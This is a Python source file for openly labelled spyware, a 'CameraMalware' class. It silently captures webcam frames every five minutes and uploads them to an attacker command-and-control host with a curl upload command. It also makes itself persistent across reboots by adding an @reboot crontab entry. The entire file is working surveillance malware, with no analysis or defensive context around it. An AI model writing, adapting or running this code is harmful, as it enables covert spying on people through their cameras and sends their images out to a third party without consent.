import cv2
import time
import os
import subprocess
from datetime import datetime

class CameraMalware:
    def __init__(self):
        self.camera = None
        self.output_dir = "/tmp/captured"
        os.makedirs(self.output_dir, exist_ok=True)
        
    def capture_image(self, camera_index=0):
        """Capture image from specified camera"""
        try:
            # Initialize camera
            self.camera = cv2.VideoCapture(camera_index)
            
            if not self.camera.isOpened():
                print(f"Failed to open camera {camera_index}")
                return False
            
            # Capture frame
            ret, frame = self.camera.read()
            if ret:
                # Save image with timestamp
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{self.output_dir}/capture_{timestamp}.jpg"
                cv2.imwrite(filename, frame)
                print(f"Image captured: {filename}")


                 # Upload to C2 server (simplified)
                self.exfiltrate_data(filename)
                
                return True
            else:
                print("Failed to capture frame")
                return False
                
        except Exception as e:
            print(f"Error capturing image: {e}")
            return False
        finally:
            if self.camera:
                self.camera.release()
    
    def exfiltrate_data(self, filename):
        """Exfiltrate captured data to C2 server"""
        # Simplified exfiltration - in real malware, use encrypted channels
        try:
            # Example: curl command to upload file
            cmd = f"curl -F 'file=@{filename}' http://attacker-server.com/upload"
            subprocess.run(cmd, shell=True, capture_output=True)
            print(f"Data exfiltrated: {filename}")
        except Exception as e:
            print(f"Exfiltration failed: {e}")
    
    def make_persistent(self):
        """Make malware persistent across reboots"""
        # Add to crontab for persistence
        cron_entry = "@reboot python3 /path/to/malware.py"
        
        try:
            # Check if entry exists
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            if cron_entry not in result.stdout:
                # Add new entry
                with open("/tmp/new_cron", "w") as f:
                    f.write(result.stdout + cron_entry + "\n")
                subprocess.run(["crontab", "/tmp/new_cron"], check=True)
                print("Persistence established")
        except Exception as e:
            print(f"Failed to establish persistence: {e}")
    
    def run(self):
        """Main execution loop"""
        self.make_persistent()
        
        while True:
            # Capture from both cameras if available
            for camera_index in [0, 1]:
                if self.capture_image(camera_index):
                    break
            
            # Wait before next capture
            time.sleep(300)  # 5 minutes

if __name__ == "__main__":
    malware = CameraMalware()
    malware.run()